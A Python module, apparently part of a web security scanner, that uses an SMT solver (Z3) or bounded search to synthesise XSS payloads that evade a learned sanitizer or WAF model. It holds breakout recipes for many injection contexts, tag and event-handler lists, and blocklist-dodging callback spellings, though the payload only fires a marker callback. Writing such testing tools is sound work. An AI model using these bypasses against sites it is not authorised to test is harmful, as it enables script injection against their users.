"""SMT Bypass Solver — turns the "math game" into a decision procedure.

Given a learned sanitizer/WAF model (a :class:`FilterConstraints`, buildable from an
L*-learned ``SanitizerProfile`` or from live ``FilterProfiler`` output) and a target
injection ``InjectionContext``, this module answers one formal question:

    ∃ x :  x survives the filter
       ∧  x reaches an executable context (the callback fires)
       ∧  x violates no blocklist / regex
       ∧  x respects length + charset limits

It returns either **SAT** with a concrete witness payload (a bypass *derived* from the
target's own algebra, not recalled from a wordlist) or **UNSAT** with a proof core naming
the constraint that makes every payload of that shape impossible — the one answer no amount
of fuzzing can give you.

Two engines back the same API:

* :class:`Z3StringEngine` — a genuine SMT encoding over the theory of strings (Z3). Slot
  choices (tag / event-handler / callback spelling) become string variables; blocklist,
  charset and length become string constraints; ``check()`` yields a model or an unsat core.
* :class:`NativeBoundedEngine` — a dependency-free bounded search over the same finite space,
  used when Z3 is unavailable and as a cross-checker.

Scope / honesty: the SMT encoding models the *blocklist / strip / charset / length* facet of a
filter precisely (that is what the learner captures). Rewriting transforms it cannot express in
string theory — recursive-strip completion, mXSS namespace mutation — are handled by *recipe
selection* (choosing a breakout that exploits the learned weakness), and every SAT witness is
re-checked against the filter *simulator* before being reported. Math proposes; the simulated
filter disposes; the live oracle is still the final judge.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Sequence, Set, Tuple

try:  # Z3 is optional — the native engine keeps the module fully functional without it.
    import z3  # type: ignore

    _HAS_Z3 = True
except Exception:  # pragma: no cover - exercised only where z3 is absent
    z3 = None  # type: ignore
    _HAS_Z3 = False

CALLBACK = "__XSS__"
# Printable-ASCII working alphabet — payloads live here and it keeps Z3's regex tractable.
_DEFAULT_ALPHABET = set(chr(c) for c in range(0x20, 0x7F))


class SolveStatus(str, Enum):
    SAT = "sat"          # a verified bypass witness exists
    UNSAT = "unsat"      # proven: no payload of the attempted shapes can bypass this filter
    UNKNOWN = "unknown"  # no recipe modeled for the context / solver gave up


@dataclass
class FilterConstraints:
    """Normalized model of what a filter does, consumed by the solver.

    Build it from a learned ``SanitizerProfile`` (:meth:`from_sanitizer_profile`) or from a
    live ``FilterProfiler`` character map (:meth:`from_filter_profile`), or construct directly
    in tests.
    """

    blocked_chars: Set[str] = field(default_factory=set)          # removed entirely by the filter
    blocked_substrings: Set[str] = field(default_factory=set)     # words the filter strips/rejects
    blocked_regexes: List[str] = field(default_factory=list)      # WAF signatures (Python regex)
    case_insensitive: bool = True                                 # is the blocklist case-folded?
    strips_recursively: bool = True                               # False ⇒ nested-strip bypass available
    allowed_charset: Optional[Set[str]] = None                    # None ⇒ full printable ASCII
    max_length: Optional[int] = None
    # Structural capabilities the learner may have proven open (widen the recipe search):
    slash_as_whitespace: bool = False
    svg_math_mutation: bool = False

    # ---- adapters -------------------------------------------------------------------

    @classmethod
    def from_sanitizer_profile(cls, profile: Any, extra_blocked: Optional[Sequence[str]] = None) -> "FilterConstraints":
        """Derive constraints from an ``analysis_engine.automata_learner.SanitizerProfile``."""
        blocked_substrings: Set[str] = set(extra_blocked or [])
        strips_recursively = True
        slash_ws = False
        svg_math = False
        case_insensitive = True

        for rule in getattr(profile, "learned_rules", []) or []:
            rtype = getattr(rule, "rule_type", "")
            name = getattr(rule, "name", "")
            if "recursive" in name and getattr(rule, "rule_type", "") == "strip":
                strips_recursively = False
            if "slash" in name:
                slash_ws = True
            if rtype == "namespace_mutation" or "mxss" in name:
                svg_math = True
            if rtype == "lowercase" or "case_sensitive" in name:
                case_insensitive = False

        # If the sanitizer strips <script>, treat "script" as a blocked structural token.
        blocked_substrings.add("script")
        return cls(
            blocked_substrings=blocked_substrings,
            case_insensitive=case_insensitive,
            strips_recursively=strips_recursively,
            slash_as_whitespace=slash_ws,
            svg_math_mutation=svg_math,
        )

    @classmethod
    def from_filter_profile(cls, char_map: Dict[str, Dict[str, Any]], **overrides: Any) -> "FilterConstraints":
        """Derive constraints from ``FilterProfiler`` per-character results.

        ``char_map`` maps a character to a dict with boolean fields like ``stripped`` /
        ``escaped`` / ``reflected`` (the shape :meth:`FilterProfiler._analyze_response` emits).
        A char that is stripped or escaped cannot appear raw in a breakout, so it is treated as
        blocked.
        """
        blocked: Set[str] = set()
        for ch, status in (char_map or {}).items():
            if not status:
                continue
            if status.get("stripped") or status.get("escaped") or status.get("blocked"):
                blocked.add(ch)
            elif status.get("reflected") is False:
                blocked.add(ch)
        c = cls(blocked_chars=blocked)
        for k, v in overrides.items():
            setattr(c, k, v)
        return c

    # ---- simulator ------------------------------------------------------------------

    def apply(self, payload: str) -> str:
        """Simulate the filter transform, so SAT witnesses can be verified deterministically."""
        out = payload
        # Character removal.
        if self.blocked_chars:
            out = "".join(ch for ch in out if ch not in self.blocked_chars)
        # Substring stripping (recursive or single-pass, mirroring real sanitizer behavior).
        flags = re.IGNORECASE if self.case_insensitive else 0
        for sub in self.blocked_substrings:
            if not sub:
                continue
            pattern = re.compile(re.escape(sub), flags)
            if self.strips_recursively:
                prev = None
                while prev != out:
                    prev = out
                    out = pattern.sub("", out)
            else:
                out = pattern.sub("", out)
        return out

    def rejects(self, payload: str) -> bool:
        """True if a WAF regex would reject the raw payload outright."""
        flags = re.IGNORECASE if self.case_insensitive else 0
        for rx in self.blocked_regexes:
            try:
                if re.search(rx, payload, flags):
                    return True
            except re.error:
                continue
        return False


@dataclass
class BreakoutRecipe:
    """A context breakout as fixed chunks interleaved with variable *slots*.

    ``segments`` is a list of either a literal ``str`` (fixed) or a ``("slot", name)`` tuple.
    ``slots`` maps a slot name to its allowed spellings; the solver picks one per slot to dodge
    the blocklist. ``required`` lists execution-critical literals that must survive the filter.
    """

    name: str
    segments: List[Any]
    slots: Dict[str, List[str]]
    required: List[str] = field(default_factory=list)
    note: str = ""


# Reusable slot alphabets — breadth here is what gives the solver room to route around a blocklist.
_TAGS = ["img", "svg", "video", "audio", "details", "iframe", "object", "body", "input", "marquee", "select", "textarea"]
_HANDLERS = [
    "onerror", "onload", "onpointerover", "onpointerenter", "onfocus",
    "ontoggle", "onanimationstart", "onbegin", "onmouseover", "onstart",
    "onwheel", "ontouchstart", "oncopy",
]


def _callback_slots(token: str) -> List[str]:
    """Spellings of the callback invocation — includes paren-less and quote-less forms."""
    return [
        f"{CALLBACK}('{token}')",
        f'{CALLBACK}("{token}")',
        f"{CALLBACK}`{token}`",          # survives when '(' or ')' is blocked
        f"{CALLBACK}(/{token}/.source)", # survives when quotes and backticks are blocked
    ]


def _recipes_for_context(context: str, token: str) -> List[BreakoutRecipe]:
    """Context → ordered list of candidate breakout recipes."""
    ctx = (context or "").upper()
    cb = _callback_slots(token)
    tag_slot = {"tag": list(_TAGS)}
    handler_slot = {"handler": list(_HANDLERS)}

    def tag_handler_recipe(prefix: str, name: str, note: str = "") -> BreakoutRecipe:
        return BreakoutRecipe(
            name=name,
            segments=[prefix + "<", ("slot", "tag"), " ", ("slot", "handler"), "=", ("slot", "cb"), ">"],
            slots={**tag_slot, **handler_slot, "cb": cb},
            required=["<", "="],
            note=note,
        )

    if ctx == "HTML_TEXT" or ctx in ("RICH_TEXT_HTML", "MARKDOWN_RENDERER", "COMMENT_BLOCK"):
        if ctx == "COMMENT_BLOCK":
            return [
                tag_handler_recipe("--><!-->", "comment_block_breakout", "close comment then inject element"),
                tag_handler_recipe("--!><!-->", "comment_block_alt_breakout", "HTML5 alt comment close and inject element"),
            ]
        return [tag_handler_recipe("", "html_tag_handler", "inject a fresh element + event handler")]

    if ctx == "ATTR_QUOTED_DOUBLE":
        return [
            tag_handler_recipe('">', "attr_dq_breakout", "close the double-quoted attribute then inject"),
            BreakoutRecipe(
                name="attr_dq_in_tag_handler",
                segments=['" ', ("slot", "handler"), "=", ("slot", "cb"), ' autofocus="'],
                slots={**handler_slot, "cb": cb},
                required=['"', "="],
                note="in-tag event handler injection when angle brackets are filtered",
            ),
        ]
    if ctx == "ATTR_QUOTED_SINGLE":
        return [
            tag_handler_recipe("'>", "attr_sq_breakout", "close the single-quoted attribute then inject"),
            BreakoutRecipe(
                name="attr_sq_in_tag_handler",
                segments=["' ", ("slot", "handler"), "=", ("slot", "cb"), " autofocus='"],
                slots={**handler_slot, "cb": cb},
                required=["'", "="],
                note="in-tag event handler injection when angle brackets are filtered",
            ),
        ]
    if ctx == "ATTR_BACKTICK":
        return [
            tag_handler_recipe("`>", "attr_bt_breakout"),
            BreakoutRecipe(
                name="attr_bt_in_tag_handler",
                segments=["` ", ("slot", "handler"), "=", ("slot", "cb"), " autofocus=`"],
                slots={**handler_slot, "cb": cb},
                required=["`", "="],
                note="in-tag backtick handler when angle brackets are filtered",
            ),
        ]
    if ctx == "ATTR_UNQUOTED":
        # No quote to close — inject a new handler attribute directly.
        return [BreakoutRecipe(
            name="attr_unquoted_handler",
            segments=[" ", ("slot", "handler"), "=", ("slot", "cb"), " x="],
            slots={**handler_slot, "cb": cb},
            required=["="],
            note="unquoted attribute — append a handler without breaking out",
        )]

    if ctx == "EVENT_HANDLER_ATTR":
        return [BreakoutRecipe(
            name="event_handler_direct",
            segments=[("slot", "cb")],
            slots={"cb": cb},
            required=[],
            note="already inside a handler — the callback executes directly",
        )]

    if ctx in ("JS_STRING_DOUBLE", "JS_STRING_SINGLE"):
        q = '"' if ctx.endswith("DOUBLE") else "'"
        return [
            BreakoutRecipe(
                name=f"js_string_breakout_{q}",
                segments=[q + ";", ("slot", "cb"), ";//"],
                slots={"cb": cb},
                required=[q, ";"],
                note="close the JS string literal and run a statement",
            ),
            tag_handler_recipe("</script>", f"js_string_script_breakout_{q}", "break out of enclosing script tag when quotes are filtered"),
        ]
    if ctx == "JS_TEMPLATE_LITERAL":
        return [
            BreakoutRecipe(
                name="js_template_interpolation",
                segments=["${", ("slot", "cb"), "}"],
                slots={"cb": cb},
                required=["${"],
                note="inject into a template-literal interpolation",
            ),
            tag_handler_recipe("</script>", "js_template_script_breakout", "break out of script block when interpolation is filtered"),
        ]
    if ctx == "JS_BLOCK" or ctx == "JS_IDENTIFIER":
        return [
            BreakoutRecipe(
                name="js_statement",
                segments=[";", ("slot", "cb"), ";"],
                slots={"cb": cb},
                required=[";"],
            ),
            tag_handler_recipe("</script>", "js_block_script_breakout", "break out of script block when statement is filtered"),
        ]

    if ctx in ("STYLE_BLOCK", "CSS_STYLE_BLOCK"):
        return [tag_handler_recipe("</style>", "style_block_breakout", "close style block and inject element")]

    if ctx == "JSON_VALUE":
        return [
            tag_handler_recipe("</script>", "json_script_breakout", "close enclosing script tag around JSON"),
            BreakoutRecipe(
                name="json_string_breakout",
                segments=['";', ("slot", "cb"), ';//'],
                slots={"cb": cb},
                required=['"', ";"],
                note="break out of JSON string literal",
            ),
        ]

    if ctx in ("URL_HREF", "URL_SRC"):
        return [BreakoutRecipe(
            name="url_javascript_scheme",
            segments=["javascript:", ("slot", "cb")],
            slots={"cb": cb},
            required=["javascript:"],
            note="javascript: URI in a navigational sink",
        )]
    if ctx in ("URL_QUERY", "URL_FRAGMENT"):
        return [tag_handler_recipe("", "url_param_reflected")]

    if ctx in ("SVG_NAMESPACE", "MATHML_NAMESPACE"):
        wrapper = "svg" if ctx.startswith("SVG") else "math"
        return [BreakoutRecipe(
            name=f"{wrapper}_ns_handler",
            segments=[f"<{wrapper}>", "<", ("slot", "tag"), " ", ("slot", "handler"), "=", ("slot", "cb"), ">"],
            slots={**tag_slot, **handler_slot, "cb": cb},
            required=["<", "="],
            note="namespace-scoped element with an event handler",
        )]

    return []  # unmodeled context → UNKNOWN


@dataclass
class BypassSolution:
    """The verdict returned by the solver."""

    status: SolveStatus
    context: str
    engine: str = "none"
    witness: Optional[str] = None            # the concrete bypass payload (SAT)
    recipe: Optional[str] = None             # which breakout produced it
    verified: bool = False                   # did the filter *simulator* preserve execution?
    unsat_core: List[str] = field(default_factory=list)   # constraints proven to conflict (UNSAT)
    rationale: str = ""
    attempted_recipes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "status": self.status.value,
            "context": self.context,
            "engine": self.engine,
            "witness": self.witness,
            "recipe": self.recipe,
            "verified": self.verified,
            "unsat_core": self.unsat_core,
            "rationale": self.rationale,
            "attempted_recipes": self.attempted_recipes,
        }


def _assemble(recipe: BreakoutRecipe, choice: Dict[str, str]) -> str:
    parts: List[str] = []
    for seg in recipe.segments:
        if isinstance(seg, tuple) and seg[0] == "slot":
            parts.append(choice[seg[1]])
        else:
            parts.append(str(seg))
    return "".join(parts)


def _structural_infeasibility_reason(recipe: BreakoutRecipe, fc: FilterConstraints) -> List[str]:
    """Explain, without a solver, why a recipe admits no witness (Z3-timeout / no-Z3 fallback)."""
    reasons: List[str] = []
    alphabet = fc.allowed_charset or _DEFAULT_ALPHABET

    def _survives(value: str) -> bool:
        if any(ch not in alphabet for ch in value) or any(ch in fc.blocked_chars for ch in value):
            return False
        low = value.lower() if fc.case_insensitive else value
        for b in fc.blocked_substrings:
            if b and (b.lower() if fc.case_insensitive else b) in low:
                return False
        return True

    for seg in recipe.segments:
        if isinstance(seg, tuple) and seg[0] == "slot":
            name = seg[1]
            if not any(_survives(o) for o in recipe.slots.get(name, [])):
                reasons.append(f"slot:'{name}' has no spelling that survives the filter/charset")
        else:
            bad = [ch for ch in str(seg) if ch in fc.blocked_chars or ch not in alphabet]
            if bad:
                reasons.append(f"fixed:'{seg}' requires blocked/absent char(s) {sorted(set(bad))!r}")
    if fc.max_length is not None:
        min_len = sum(len(str(s)) for s in recipe.segments if not (isinstance(s, tuple) and s[0] == "slot"))
        min_len += sum(min((len(o) for o in recipe.slots[n]), default=0)
                       for n in recipe.slots)
        if min_len > fc.max_length:
            reasons.append(f"length:minimum breakout length {min_len} > max_length {fc.max_length}")
    return reasons or ["no surviving assignment over the finite slot space"]


class NativeBoundedEngine:
    """Dependency-free bounded search over the recipe × slot space (Z3-free fallback + cross-check)."""

    name = "native"

    @staticmethod
    def solve_recipe(recipe: BreakoutRecipe, fc: FilterConstraints) -> Optional[Tuple[str, Dict[str, str]]]:
        slot_names = [s for s in recipe.slots]
        alphabet = fc.allowed_charset or _DEFAULT_ALPHABET

        def _slot_ok(value: str) -> bool:
            if any(ch not in alphabet for ch in value):
                return False
            low = value.lower() if fc.case_insensitive else value
            for b in fc.blocked_substrings:
                if not b:
                    continue
                if (b.lower() if fc.case_insensitive else b) in low:
                    return False
            if any(ch in fc.blocked_chars for ch in value):
                return False
            return True

        # Filter each slot's alternatives down to the surviving spellings first (prunes the product).
        viable: Dict[str, List[str]] = {}
        for name in slot_names:
            options = [v for v in recipe.slots[name] if _slot_ok(v)]
            if not options:
                return None  # a required slot has no surviving spelling
            viable[name] = options

        # Cartesian search (spaces are small: tags×handlers×cb ≈ 9×9×3).
        def _recurse(i: int, choice: Dict[str, str]) -> Optional[Tuple[str, Dict[str, str]]]:
            if i == len(slot_names):
                candidate = _assemble(recipe, choice)
                if fc.max_length is not None and len(candidate) > fc.max_length:
                    return None
                if fc.rejects(candidate):
                    return None
                # Verify against the filter simulator: execution structure must survive.
                survived = fc.apply(candidate)
                if all((r in survived) for r in recipe.required) and CALLBACK in survived:
                    return candidate, dict(choice)
                return None
            name = slot_names[i]
            for opt in viable[name]:
                choice[name] = opt
                got = _recurse(i + 1, choice)
                if got:
                    return got
            return None

        return _recurse(0, {})


class Z3StringEngine:
    """Genuine SMT encoding over the theory of strings — yields SAT witnesses and UNSAT cores."""

    name = "z3"

    @classmethod
    def solve_recipe(cls, recipe: BreakoutRecipe, fc: FilterConstraints, timeout_ms: int = 4000):
        """Return (witness, choice) on SAT, ("UNSAT", core) on proven infeasibility, or
        (None, ["z3-timeout"]) if the string solver did not converge in time.

        Z3's ``Contains``-over-``Concat`` reasoning can be expensive, so a wall-clock timeout keeps
        the engine bounded; callers treat a timeout as "no definite Z3 verdict" and fall back.
        """
        s = z3.Solver()
        s.set(unsat_core=True)
        s.set("timeout", timeout_ms)
        alphabet = fc.allowed_charset or _DEFAULT_ALPHABET

        # Charset is enforced structurally rather than with a costly Star(Union(...)) regex:
        # a fixed segment outside the alphabet makes the whole recipe infeasible; slot spellings
        # outside the alphabet are pruned from the variable's domain.
        for seg in recipe.segments:
            if not (isinstance(seg, tuple) and seg[0] == "slot"):
                bad = {ch for ch in str(seg) if ch not in alphabet}
                if bad:
                    return "UNSAT", [f"charset:missing {sorted(bad)!r} required by breakout"]

        slot_vars: Dict[str, Any] = {}
        for name, options in recipe.slots.items():
            in_charset = [o for o in options if all(ch in alphabet for ch in o)]
            if not in_charset:
                return "UNSAT", [f"charset:no spelling of slot '{name}' fits the allowed charset"]
            v = z3.String(f"slot_{name}")
            slot_vars[name] = v
            s.assert_and_track(z3.Or(*[v == z3.StringVal(o) for o in in_charset]), f"slot:{name}")

        # Assemble the candidate as a Z3 string via Concat.
        pieces = []
        for seg in recipe.segments:
            if isinstance(seg, tuple) and seg[0] == "slot":
                pieces.append(slot_vars[seg[1]])
            else:
                pieces.append(z3.StringVal(str(seg)))
        candidate = pieces[0] if len(pieces) == 1 else z3.Concat(*pieces)

        if fc.max_length is not None:
            s.assert_and_track(z3.Length(candidate) <= fc.max_length, "max_length")

        for i, b in enumerate(sorted(fc.blocked_substrings)):
            if not b:
                continue
            variants = {b}
            if fc.case_insensitive:
                variants |= {b.lower(), b.upper()}
            for j, var in enumerate(sorted(variants)):
                s.assert_and_track(z3.Not(z3.Contains(candidate, z3.StringVal(var))), f"blocked_sub:{b}#{j}")
        for i, ch in enumerate(sorted(fc.blocked_chars)):
            s.assert_and_track(z3.Not(z3.Contains(candidate, z3.StringVal(ch))), f"blocked_char:{ch}")

        result = s.check()
        if result == z3.sat:
            m = s.model()
            choice = {name: m[v].as_string() for name, v in slot_vars.items()}
            return _assemble(recipe, choice), choice
        if result == z3.unsat:
            core = [str(c) for c in s.unsat_core()]
            return "UNSAT", core
        return None, ["z3-timeout"]  # z3.unknown (timeout) — no definite verdict


class SMTBypassSolver:
    """Public entry point: given a context + filter model, return a bypass witness or an UNSAT proof."""

    def __init__(self, prefer_z3: bool = True, certify_unsat: bool = True):
        # The per-recipe slot space is finite, so native enumeration is a *complete* decision
        # procedure for SAT. Z3 is used to certify infeasibility with a minimal unsat core.
        self.use_z3 = _HAS_Z3 and (prefer_z3 or certify_unsat)
        self.certify_unsat = certify_unsat and _HAS_Z3

    def solve(self, context: str, constraints: FilterConstraints, token: str = "{TOKEN}") -> BypassSolution:
        recipes = _recipes_for_context(context, token)
        if not recipes:
            return BypassSolution(
                status=SolveStatus.UNKNOWN,
                context=context,
                rationale=f"No breakout recipe modeled for context '{context}'.",
            )

        attempted: List[str] = []
        last_core: List[str] = []
        for recipe in recipes:
            attempted.append(recipe.name)

            # SAT decision: complete enumeration over the finite slot space.
            native = NativeBoundedEngine.solve_recipe(recipe, constraints)
            if native is not None:
                witness, _ = native
                survived = constraints.apply(witness)
                verified = (all(r in survived for r in recipe.required)
                            and CALLBACK in survived and not constraints.rejects(witness))
                return BypassSolution(
                    status=SolveStatus.SAT,
                    context=context,
                    engine="native+z3" if self.use_z3 else "native",
                    witness=witness,
                    recipe=recipe.name,
                    verified=verified,
                    rationale=recipe.note or "bypass synthesized from filter model",
                    attempted_recipes=attempted,
                )

            # This recipe is infeasible; obtain a formal proof core from Z3 when it converges.
            if self.certify_unsat:
                z_res, z_extra = Z3StringEngine.solve_recipe(recipe, constraints)
                if isinstance(z_res, str) and z_res == "UNSAT":
                    last_core = z_extra
                elif not last_core:
                    last_core = _structural_infeasibility_reason(recipe, constraints)
            elif not last_core:
                last_core = _structural_infeasibility_reason(recipe, constraints)

        # No recipe admitted a witness → provably no bypass of any modeled shape.
        return BypassSolution(
            status=SolveStatus.UNSAT,
            context=context,
            engine="native+z3" if self.certify_unsat else "native",
            unsat_core=last_core,
            rationale="No payload of any modeled breakout shape can survive this filter within the given limits.",
            attempted_recipes=attempted,
        )


def solve_for_profile(profile: Any, context: str, token: str = "{TOKEN}",
                      extra_blocked: Optional[Sequence[str]] = None) -> BypassSolution:
    """Convenience: go straight from an L*-learned ``SanitizerProfile`` to a bypass verdict."""
    fc = FilterConstraints.from_sanitizer_profile(profile, extra_blocked=extra_blocked)
    return SMTBypassSolver().solve(context, fc, token)
